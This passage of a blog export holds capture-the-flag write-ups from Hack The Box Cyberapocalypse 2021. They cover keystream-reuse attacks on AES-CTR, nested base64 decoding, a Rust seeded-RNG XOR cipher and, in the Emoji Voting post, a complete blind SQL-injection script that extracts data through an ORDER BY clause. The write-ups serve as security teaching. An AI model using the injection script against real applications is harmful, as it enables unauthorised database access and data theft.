cipher.encrypt(plaintext)\\n    return ciphertext.hex()\\n\\n\\ntest = b\\"No right of private conversation was enumerated in the Constitution. I don\'t suppose it occurred to anyone at the time that it could be prevented.\\"\\nprint(encrypt(test))\\n\\nwith open(\'flag.txt\', \'rb\') as f:\\n    flag = f.read().strip()\\nprint(encrypt(flag))\\n```\\n\\nBy looking at the code, we don\'t see any immediate weaknesses like generating random numbers with a known seed for example.\\n\\nWe also have the output of running this code.\\n\\n```sh\\ncat output.txt \\n464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c\\n4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea\\n```\\n\\nAnd here we can notice something. The output consists of 2 separate lines. Could it be that we also have the output of encrypting the test string? Let\'s count the characters in the first line vs the test string.\\n\\n```sh\\necho 464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c| wc -c\\n293\\n```\\n\\n```sh\\necho \\"No right of private conversation was enumerated in the Constitution. I don\'t suppose it occurred to anyone at the time that it could be prevented.\\"| xxd -ps | tr -d \\\\n | wc -c\\n294\\n```\\n\\nWell, we have error of off by one, which is pretty common when counting with `wc`. But we can safely assume that this is the same string.\\n\\nWhich means that we have 2 encrypted strings using the same **key** and **counter**!\\n\\n### Analysis\\n\\nStreaming cyphers are generally safe only if the key stream is only used once. Right now we have two cipher texts generated by the same keystream. Let\'s see what comes out of that.\\n\\n$$\\nC_1 = P_1 \\\\oplus K\\n$$\\n\\n$$\\nC_2 = P_2 \\\\oplus K\\n$$\\n\\nWe generate two ciphertexts $C_1 \\\\text{ and } C_2$ byt XORing the plaintexts $P_1,P_2$ with the same keystream $K$. If we now XOR the two ciphertexts together, we get\\n\\n$$\\nC_1 \\\\oplus C_2 = P_1 \\\\oplus K \\\\oplus P_2 \\\\oplus K \\\\text{.}\\n$$\\n\\nBut, because an XOR is its own inverse, we can use that $K \\\\oplus K = 0$, so\\n\\n$$\\nC_1 \\\\oplus C_2 = P_1 \\\\oplus P_2 \\\\text{,}\\n$$\\n\\nmeaning that we simply have the two plaintexts XORed with each-other. This is completely reversible! If we know one of the plaintexts, we can XOR the value we have from above with that plaintext, and get the other!\\n\\n$$\\nC_1 \\\\oplus C_2 \\\\oplus P_1 = P_1 \\\\oplus P_2 \\\\oplus P_1 = P_2\\n$$\\n\\n### Solution\\n\\nWell, we have the two ciphertexts, and we have one of the plaintexts. So our solution is to\\n\\n1. XOR the two output values with each-other.\\n2. XOR the plaintext `No right of private conversation was` with the XOR result from `1`.\\n3. Get the flag\\n\\n```python\\n#!/usr/bin/env python3\\n\\nciphertext1 = \'464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c\'\\n\\nciphertext2 = \'4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea\'\\n\\nplaintext = b\'No right of private conversation was enumerated in the Constitution. I don\\\\\'t suppose it occurred to anyone at the time that it could be prevented.\'.hex()\\n\\ndef xor(hex1, hex2, getAscii = False):\\n  result = []\\n\\n  for ind in range(0, len(hex1), 2):\\n    longIndex = ind\\n    shortIndex = ind%len(hex2)\\n    hexChar1 = hex1[longIndex:longIndex+2]\\n    byte1 = int(hexChar1, 16)\\n\\n    hexChar2 = hex2[shortIndex:shortIndex+2]\\n    byte2 = int(hexChar2, 16)\\n\\n    asciiNum = byte1 ^ byte2\\n    result.append(chr(asciiNum))\\n\\n\\n  out = \'\'.join(result)\\n  if getAscii:\\n    print(\'Result:\', out)\\n    return out\\n  else:\\n    out = out.encode(\'utf-8\').hex()\\n    print(\'Result:\', out)\\n    return out\\n    \\n\\nxored = xor(ciphertext2, ciphertext1)\\n\\nflag = xor(xored, plaintext, True)\\n```\\n\\nAnd so, we get our flag\\n\\n```sh\\nResult: 0d27743012155b01155c027f1b41302955203114002413\\nResult: CHTB{r3u53d_k3Y_4TT4cK}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"phasestream-4-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/phasestream-4-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-28-10:18:15phasestream-4-cyberapocalypse-2021-ctf.md","title":"Phasestream 4 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 4, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","date":"2021-04-28T00:00:00.000Z","formattedDate":"April 28, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.33,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"phasestream-4-cyberapocalypse-2021-ctf","title":"Phasestream 4 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 4, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Phasestream 3 - Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-3-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Nintendo Base64 - Cyberapocalypse 2021 CTF","permalink":"/blog/nintendo-base64-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the challenge Phasestream 4, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.\\n\\n### Prompt\\n\\nThe aliens saw us break PhaseStream 3 and have proposed a quick fix to protect their new cipher.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWhat we see here, is a direct continuation of the Phasestream 3 challenge. You should probably check out my write-up of that one, if you don\'t know the concept of repating keystream attacks.\\n\\n[Phasestream 3 - Cyberapocalypse 2021 CTF](/blog/phasestream-3-cyberapocalypse-2021-ctf/)\\n\\nThe only main difference from this last challenge, is that we no longer have the `test` plaintext string readily available to us. But we still have its encrypted value in our `output.txt`\\n\\n```sh\\ncat output.txt 2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955 2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65\\n```\\n\\nThe code of the encryptor itself hasn\'t changed other than not showing the test text.\\n\\n```python\\nfrom Crypto.Cipher import AES\\nfrom Crypto.Util import Counter\\nimport os\\n\\nKEY = os.urandom(16)\\n\\n\\ndef encrypt(plaintext):\\n    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128))\\n    ciphertext = cipher.encrypt(plaintext)\\n    return ciphertext.hex()\\n\\n\\nwith open(\'test_quote.txt\', \'rb\') as f:\\n    test_quote = f.read().strip()\\nprint(encrypt(test_quote))\\n\\nwith open(\'flag.txt\', \'rb\') as f:\\n    flag = f.read().strip()\\nprint(encrypt(flag))\\n```\\n\\nBut we do get the information, that the test string is a **quote**.\\n\\n### Analysis\\n\\nWell, our first steps of finding the solution are pretty much the same as in Phasestream 3:\\n\\n1. We XOR the two ciphertexts from output.txt together\\n2. Since we know that our flag starts with `CHTB{`, we will XOR the result of `1.` with it, to see the first letters of our quote.\\n\\n```python\\n#!/usr/bin/env python3\\n\\nciphertext1 = \'2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955\'\\n\\nciphertext2 = \'2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65\'\\n\\nflagStart = b\'CHTB{\'.hex()\\n\\ndef xor(hex1, hex2, getAscii = False):\\n  result = []\\n\\n  for ind in range(0, len(hex1), 2):\\n    longIndex = ind\\n    shortIndex = ind%len(hex2)\\n    hexChar1 = hex1[longIndex:longIndex+2]\\n    byte1 = int(hexChar1, 16)\\n\\n    hexChar2 = hex2[shortIndex:shortIndex+2]\\n    byte2 = int(hexChar2, 16)\\n\\n    asciiNum = byte1 ^ byte2\\n    result.append(chr(asciiNum))\\n\\n\\n  out = \'\'.join(result)\\n  if getAscii:\\n    print(\'Result:\', out)\\n    return out\\n  else:\\n    out = out.encode(\'utf-8\').hex()\\n    print(\'Result:\', out)\\n    return out\\n    \\n\\nxored = xor(ciphertext2, ciphertext1)\\n\\nstartQuote = xor(xored, flagStart, True)\\n```\\n\\n```sh\\nResult: 0a68352e141d1152060003310c1d500b0d131d38124900003a52121a010900734b070c07543b45020c1d7f0213162b56144c1d111d0f074c043c06002c184e1b1f0b7f070d150c1c541117543c13111515064b1e1c\\nResult: I alo^YD{@yX_+HEG_CQTBAZNCrC;EwDoyOU+@hUcV7^YIM|LhD{oPYdH7SOnOTSltGSnVN\\\\g\\n```\\n\\nSo, from our analysis, we can see that the `test_quote` string starts with \\"I alo\\". I think it\'s easy to assume, that the first two words will be \\"I alone\\".\\n\\n### Solution\\n\\nThis one took a bit of research. We had to find a popular quote, which starts with \\"I alone\\". After a couple of tries, I found that to be a quote by _Mother Theresa_, which reads as follows:\\n\\n> I alone cannot change the world, but I can cast a stone across the water to create many ripples.\\n\\nSo, we can take our XOR result from step 1 of the analysis, and XOR it with this quote.\\n\\nThis gives us the flag to be as follows\\n\\n```sh\\nResult: 0a68352e141d1152060003310c1d500b0d131d38124900003a52121a010900734b070c07543b45020c1d7f0213162b56144c1d111d0f074c043c06002c184e1b1f0b7f070d150c1c541117543c13111515064b1e1c\\nResult: CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"nintendo-base64-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/nintendo-base64-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-28-12:58:58nintendo-base64-cyberapocalypse-2021-ctf.md","title":"Nintendo Base64 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Nintendo Base64, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","date":"2021-04-28T00:00:00.000Z","formattedDate":"April 28, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.105,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"nintendo-base64-cyberapocalypse-2021-ctf","title":"Nintendo Base64 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Nintendo Base64, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Phasestream 4 - Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-4-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Emoji Voting - Cyberapocalypse 2021 CTF","permalink":"/blog/emoji-voting-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the challenge Nintendo Base64, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.\\n\\n### Prompt\\n\\nAliens are trying to cause great misery for the human race by using our own cryptographic technology to encrypt all our games.\\n\\nFortunately, the aliens haven\'t played CryptoHack so they\'re making several noob mistakes. Therefore they\'ve given us a chance to recover our games and find their flags.\\n\\nThey\'ve tried to scramble data on an N64 but don\'t seem to understand that encoding and ASCII art are not valid types of encryption!\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nReally, the prompt pretty much tells us all we need to know. We look at the `output.txt` file we\'ve received, and see that it\'s a string of random letters shaped into ASCII art.\\n\\n```sh\\n            Vm                                                   0w               eE5GbFdWW         GhT            V0d4VVYwZ\\n            G9              XV                                   mx              yWk    ZOV       1JteD           BaV     WRH\\n                            YW                                   xa             c1              NsWl dS   M1   JQ WV       d4\\nS2RHVkljRm  Rp UjJoMlZrZH plRmRHV m5WaVJtUl hUVEZLZVZk   V1VrZFpWMU  pHVDFaV1Z  tSkdXazlXYW   twdl   Yx    Wm Fj  bHBFVWxWTlZ\\nXdz     BWa 2M xVT     FSc  1d   uTl     hi R2h     XWW taS     1dG VXh     XbU ZTT     VdS elYy     cz     FWM    kY2VmtwV2\\nJU       RX dZ ak       Zr  U0   ZOc2JGWmlS a3       BY V1       d0 YV       lV MH       hj RVpYYlVaVFRWW  mF lV  mt       3V\\nlR       GV 01 ER       kh  Zak  5rVj   JFe VR       Ya Fdha   3BIV mpGU   2NtR kdX     bWx          oT   TB   KW VYxW   lNSM\\nWx       XW kV kV       mJ  GWlRZ bXMxY2xWc 1V       sZ  FRiR1J5VjJ  0a1YySkdj   RVpWVmxKV           1V            GRTlQUT09\\n```\\n\\nWe can also probably quite safely assume, that this is encoded in base64.\\n\\nSo, as part of our analysis, we strip the string of its spaces and newlines, and feed it to `base64 -d`\\n\\n```sh\\ncat output.txt | tr -d \' \' | tr -d \\\\n | base64 -d\\nVm0xNFlWVXhSWGxUV0doWVlrZFNWRmx0ZUdGalZsSlZWR3RPYWxKdGVIcFdiR2h2VkdzeFdGVnViRmRXTTFKeVdWUkdZV1JGT1ZWVmJGWk9WakpvV1ZaclpEUlVNVWw0Vkc1U1RsWnNXbGhWYkZKWFUxWmFSMWRzV2s1V2F6VkpWbTEwYjFkSFNsbFZiRkpXWWtaYU0xcEZXbUZTTVZaeVkwVTFWMDFHYjNkV2EyTXhWakpHVjFScmFGWmlhM0JYV1ZSR1lWZEdVbFZTYms1clVsUldTbGRyV2tkV2JGcEZVVlJWUFE9PQ==\\n```\\n\\nBut we notice, that the output of that command is yet another base64 string (given away by the equal signs at the end).\\n\\n### Solution\\n\\nSo, let\'s just write a simple script which\\n\\n1. Opens the `output.txt` file, and strips the content of newlines and spaces\\n2. Feed it into a loop which applies `b64decode`\\n3. And print the output, if it starts with our flag prompt `CHTB{`\\n\\n```python\\n#!/usr/bin/env python3\\n\\nimport base64 as b64\\n\\nflag = \'\'\\nwith open(\'output.txt.2\', \'r\') as f:\\n  shouldContinue = True\\n  candidate = f.read().replace(\'\\\\n\', \'\').replace(\' \', \'\')\\n  while shouldContinue:\\n    candidate = b64.b64decode(candidate)\\n    if b\'CHTB{\' in candidate:\\n      flag = candidate.decode()\\n      shouldContinue = False\\n\\nprint(flag)\\n```\\n\\nSo, we get the flag just like that\\n\\n```sh\\nCHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"emoji-voting-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/emoji-voting-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-28-20:40:26emoji-voting-cyberapocalypse-2021-ctf.md","title":"Emoji Voting - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Emoji voting challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-28T00:00:00.000Z","formattedDate":"April 28, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":5.635,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"emoji-voting-cyberapocalypse-2021-ctf","title":"Emoji Voting - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Emoji voting challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Nintendo Base64 - Cyberapocalypse 2021 CTF","permalink":"/blog/nintendo-base64-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Soulcrabber - Cyberapocalypse 2021 CTF","permalink":"/blog/soulcrabber-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Emoji voting challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n## Prompt\\n\\nA place to vote your favourite and least favourite puny human emojis!\\n\\n\x3c!-- truncate --\x3e\\n\\n## Recon\\n\\nFor this challenge, we are given the source code. We notice, that the technologies of interest in the back-end are nodejs running an express server, and sqlite for a database. \\n\\n### What\'s vulnerable?\\n\\nAfter some poking around, we find that the most useful file for us is  `database.js`. In it we find two functions for getting access to the database, and one in particular stands out.\\n\\n```js\\nasync getEmojis(order) {\\n        // TOOD: add parametrization\\n        return new Promise(async (resolve, reject) => {\\n            try {\\n                let query = `SELECT * FROM emojis ORDER BY ${ order }`;\\n                console.log(query)\\n                resolve(await this.db.all(query));\\n            } catch(e) {\\n                console.log(e)\\n                reject(e);\\n            }\\n        });\\n    }\\n```\\n\\nAs the comment in the code suggests, there\'s no parametrisation in building the query, and so it might be subject to some form of injection.\\n\\n### Where\'s the flag?\\n\\nAfter looking around a bit more, we find that the database consists of two tables - one for storing the emojis, but also one which holds the flag. The one with the flag has a name, which starts with `flag_`, but the second part of the name is 5 random bytes in hex (so 10 characters).\\n\\n```js\\nasync migrate() {\\n  let rand = crypto.randomBytes(5).toString(\'hex\');\\n\\n  return this.db.exec(`\\n    DROP TABLE IF EXISTS emojis;\\n    DROP TABLE IF EXISTS flag_${ rand };\\n\\n    CREATE TABLE IF NOT EXISTS flag_${ rand } (\\n    flag TEXT NOT NULL\\n    );\\n\\n    INSERT INTO flag_${ rand } (flag) VALUES (\'CHTB{f4k3_fl4g_f0r_t3st1ng}\');\\n\\n    CREATE TABLE IF NOT EXISTS emojis (\\n    id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,\\n    emoji   VARCHAR(255),\\n    name    VARCHAR(255),\\n    count   INTEGERT\\n    );\\n\\n    INSERT INTO emojis (emoji, name, count) VALUES \\n    (\'\ud83d\udc7d\', \'alien\', 13),\\n    (\'\ud83d\udef8\', \'flying saucer\', 3),\\n    (\'\ud83d\udc7e\', \'alien monster\', 0),\\n    (\'\ud83d\udca9\', \'\ud83d\udc47 = human\', 118),\\n    (\'\ud83d\udebd\', \'\ud83d\udc47 = human\', 19),\\n    (\'\ud83e\udea0\', \'\ud83d\udc47 = human\', 2),\\n    (\'\ud83c\udf46\', \'eggplant\', 69),\\n    (\'\ud83c\udf51\', \'peach\', 40),\\n    (\'\ud83c\udf4c\', \'banana\', 21),\\n    (\'\ud83d\udc36\', \'dog\', 80),\\n    (\'\ud83d\udc37\', \'pig\', 37),\\n    (\'\ud83d\udc68\', \'homo idiotus\', 124)\\n  `);\\n}\\n```\\n\\n## Analysis\\n\\n### Attack vector\\n\\nWe might have our place of attack, but we have a problem. It seems that we\'re only allowed to inject into the `ORDER BY` clause of the select statement.\\n\\n```js\\nlet query = `SELECT * FROM emojis ORDER BY ${ order }`;\\n```\\n\\nAnd this is not that easy. SQL doesn\'t accept UNION, WHERE, OR or AND clauses in the ORDER BY clause, so we need to use a nested query inside of it.\\n\\nNot only that, but the only result that we can expect back is a change in the ordering of our emojis.\\n\\n### What we need to find\\n\\nWe need the flag of course. But the flag is stored as an entry inside of a table we don\'t know the name of.\\n\\nAnd since we can only inject into an ORDER BY clause, we can\'t get the name of the table (or the value of the flag for that matter) directly, but have to guess it letter by letter.\\n\\nLet\'s build an example. Say we want to check if the 5th symbol of the table name is indeed `_` as in `flag_`. That would be `5F` in hex. We can do this like so\\n\\n```sql\\nSELECT * FROM emojis\\nORDER BY\\n\\t(CASE\\n    \\t(SELECT HEX(SUBSTR(tbl_name, 5, 1)) from \\n        \\t(SELECT tbl_name FROM sqlite_master\\n            \\tWHERE type=\'table\' and tbl_name like \'flag%\'))\\n     WHEN \'5F\' THEN name ELSE count END) DESC\\n```\\n\\n> Note: sqlite can\'t turn symbols into ASCII codes, so we have to use HEX instead. Also, HEX only matches hexes with no prefix (like `0x`), and only with capital letters (like `D4`).\\n\\nThe statement above will return the emojis in descending order by `name` if the fifth symbol is `_`, or ordered by `count` if the 5th symbol isn\'t an underscore.\\n\\n## Solution\\n\\nWith our example in mind, let\'s build a script which will get the table name with the flag in it. We need to\\n\\n1. Build a dictionary of printable symbols in hex\\n2. For each position in the name of the table, iterate through our dicitonary of symbols\\n3. If the order of the emojis corresponds to a True statement, record that symbol as part of the table name\\n4. Rinse and repeat until we reach the length of the table name (which we know is `flag_ + 10 ASCII symbols (5bytes in hex)`.\\n\\n```python\\n#!/usr/bin/env python3\\n\\nimport requests\\nimport string\\n\\nurl = \'http://138.68.179.198:32342/api/list\'\\n\\nlistOfPrintable = list(string.printable)\\nlistOfHexies = []\\nfor char in listOfPrintable:\\n  listOfHexies.append(format(ord(char), \'x\').upper())\\ndictie = dict(zip(listOfHexies, listOfPrintable))\\n\\ndef findTableName():\\n  tableNameLen = 15\\n  tableName = \'flag_\'\\n  lookForCharOfIndex = 6\\n\\n  while lookForCharOfIndex <= tableNameLen:\\n\\n    for hexie in listOfHexies:\\n      data = {\\"order\\":f\\"(CASE (SELECT HEX(SUBSTR(tbl_name, {lookForCharOfIndex}, 1)) from (SELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name like \'flag%\') ) WHEN \'{hexie}\' THEN name ELSE count END) DESC--\\"}\\n\\n      r = requests.post(url, data=data)\\n\\n      check = \'\\"id\\":4\' in r.text[0:10]\\n      if check == True:\\n        tableName += dictie[hexie]\\n        lookForCharOfIndex += 1\\n        print (tableName)\\n\\n  return tableName\\n\\ntableName = findTableName()\\n```\\n\\nThis will spit out the name of the flag table for us, which in this case was\\n\\n```sh\\nflag_5ba432deb9\\n```\\n\\nNext, we repeat the same process for the flag inside of that table, but we slightly modify our statement, to look for characters inside the flag entry, instead of the table name. This one actually ends up being easier to set up.\\n\\n```js\\ndata = {\\n    \\"order\\":f\\"\\"\\"(CASE \\n    (SELECT HEX(SUBSTR(flag, {lookForCharOfIndex}, 1)) from\\n    {foundTbaleName} ) WHEN \'{hexie}\' THEN name ELSE count END) DESC--\\"\\"\\"\\n}\\n```\\n\\nAnd so, we can build and add our `getFlag` function into our script. The whole thing looks like so:\\n\\n```python\\n#!/usr/bin/env python3\\n\\nimport requests\\nimport string\\n\\nurl = \'http://138.68.179.198:32342/api/list\'\\n\\nlistOfPrintable = list(string.printable)\\nlistOfHexies = []\\nfor char in listOfPrintable:\\n  listOfHexies.append(format(ord(char), \'x\').upper())\\ndictie = dict(zip(listOfHexies, listOfPrintable))\\n\\ndef findTableName():\\n  tableNameLen = 15\\n  tableName = \'flag_\'\\n  lookForCharOfIndex = 6\\n\\n  while lookForCharOfIndex <= tableNameLen:\\n\\n    for hexie in listOfHexies:\\n      data = {\\"order\\":f\\"(CASE (SELECT HEX(SUBSTR(tbl_name, {lookForCharOfIndex}, 1)) from (SELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name like \'flag%\') ) WHEN \'{hexie}\' THEN name ELSE count END) DESC--\\"}\\n\\n      r = requests.post(url, data=data)\\n\\n      check = \'\\"id\\":4\' in r.text[0:10]\\n      if check == True:\\n        tableName += dictie[hexie]\\n        lookForCharOfIndex += 1\\n        print (tableName)\\n\\n  return tableName\\n\\ndef getFlag(foundTbaleName):\\n  flag = \'CHTB{\'\\n  lookForCharOfIndex = 6\\n\\n  while True:\\n    foundLast = \'{\'\\n    for hexie in listOfHexies:\\n      data = {\\"order\\":f\\"(CASE (SELECT HEX(SUBSTR(flag, {lookForCharOfIndex}, 1)) from {foundTbaleName} ) WHEN \'{hexie}\' THEN name ELSE count END) DESC--\\"} # look for FLAG!\\n\\n      r = requests.post(url, data=data)\\n      check = \'\\"id\\":4\' in r.text[0:10]\\n      if check == True:\\n        foundLast = dictie[hexie]\\n        flag += dictie[hexie]\\n        lookForCharOfIndex += 1\\n        print (flag)\\n    if foundLast == \'}\':\\n      break\\n\\ntableName = findTableName()\\ngetFlag(tableName)\\n```\\n\\nWhich will spit out our flag\\n\\n```sh\\nCHTB{order_me_this_juicy_info}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"soulcrabber-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/soulcrabber-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-27-15:35:53soulcrabber-cyberapocalypse-2021-ctf.md","title":"Soulcrabber - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Soulcrabber challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","date":"2021-04-27T00:00:00.000Z","formattedDate":"April 27, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.615,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"soulcrabber-cyberapocalypse-2021-ctf","title":"Soulcrabber - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Soulcrabber challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Emoji Voting - Cyberapocalypse 2021 CTF","permalink":"/blog/emoji-voting-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Wild goose hunt - Cyberapocalypse 2021 CTF","permalink":"/blog/wild-goose-hunt-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Soulcrabber challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.\\n\\n### Propmpt\\n\\nAliens heard of this cool newer language called Rust, and hoped the safety it offers could be used to improve their stream cipher.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe get a Rust script which applies a seemingly random XOR cypher to a `flag.txt` file, and outputs it in _hex_ to `out.txt`. We also get the output file, so all we have to do is reverse the procedure.\\n\\n```rust\\nuse rand::{Rng,SeedableRng};\\nuse rand::rngs::StdRng;\\nuse std::fs;\\nuse std::io::Write;\\n\\nfn get_rng() -> StdRng {\\n    let seed = 13371337;\\n    return StdRng::seed_from_u64(seed);\\n}\\n\\nfn rand_xor(input : String) -> String {\\n    let mut rng = get_rng();\\n    return input\\n        .chars()\\n        .into_iter()\\n        .map(|c| format!(\\"{:02x}\\", (c as u8 ^ rng.gen::<u8>())))\\n        .collect::<Vec<String>>()\\n        .join(\\"\\");\\n}\\n\\nfn main() -> std::io::Result<()> {\\n    let flag = fs::read_to_string(\\"flag.txt\\")?;\\n    let xored = rand_xor(flag);\\n    println!(\\"{}\\", xored);\\n    let mut file = fs::File::create(\\"out.txt\\")?;\\n    file.write(xored.as_bytes())?;\\n    Ok(())\\n}\\n```\\n\\nSequence of events:\\n\\n 1. Open a file `flag.txt`.\\n 2. Generate a random key for XOR by using the seed `13371337`.\\n 3. XOR the contents of `flag.txt` with the key.\\n 4. Write out the result onto `out.txt`.\\n\\nAlthough the code for XOR is generated by a random number generator, we immediately notice that the RNG is supplied with a known seed. This automatically means, that the numbers generated by it will follow the same sequence every time.\\n\\nSo all we have to do to reverse the process is to supply `out.txt` as input (in hex) to the function, and we will get the original flag in hex as output.\\n\\n### Solution\\n\\nSequence:\\n\\n1. Read the hex value contents of `out.txt`.\\n2. Generate the pseudo-random key by using the same seed.\\n3. XOR the contents of `out.txt`.\\n4. Write the XORed value onto `flag.txt`.\\n5. Represent the hex value of the key in ASCII using `xxd`.\\n\\n```rust\\nuse rand::{Rng,SeedableRng};\\nuse rand::rngs::StdRng;\\nuse std::fs;\\nuse std::io::Write;\\nuse std::io::prelude::*;\\n\\nfn get_rng() -> StdRng {\\n    let seed = 13371337;\\n    return StdRng::seed_from_u64(seed);\\n}\\n\\nfn rand_xor(input :&mut [u8]) -> String {\\n    let mut rng = get_rng();\\n    return input\\n        // .chars()\\n        .into_iter()\\n        .map(|c| format!(\\"{:02x}\\", (*c ^ rng.gen::<u8>())))\\n        .collect::<Vec<String>>()\\n        .join(\\"\\");\\n}\\n\\nfn main() -> std::io::Result<()> {\\n    // we now read the file contents into a vector of u8 values\\n    let mut file_content = Vec::new();\\n    let mut file = fs::File::open(\\"out.txt\\").expect(\\"Unable to open file\\");\\n    file.read_to_end(&mut file_content).expect(\\"Unable to read\\");\\n    let xored = rand_xor(&mut file_content);\\n    println!(\\"{}\\", xored);\\n    let mut file = fs::File::create(\\"flag.txt\\")?;\\n    file.write(xored.as_bytes())?;\\n    Ok(())\\n}\\n```\\n\\n\\nOf course, since this is the first time I had to deal with Rust, I had to install a lot of stuff first. After that, to generate the needed files to build the project, we 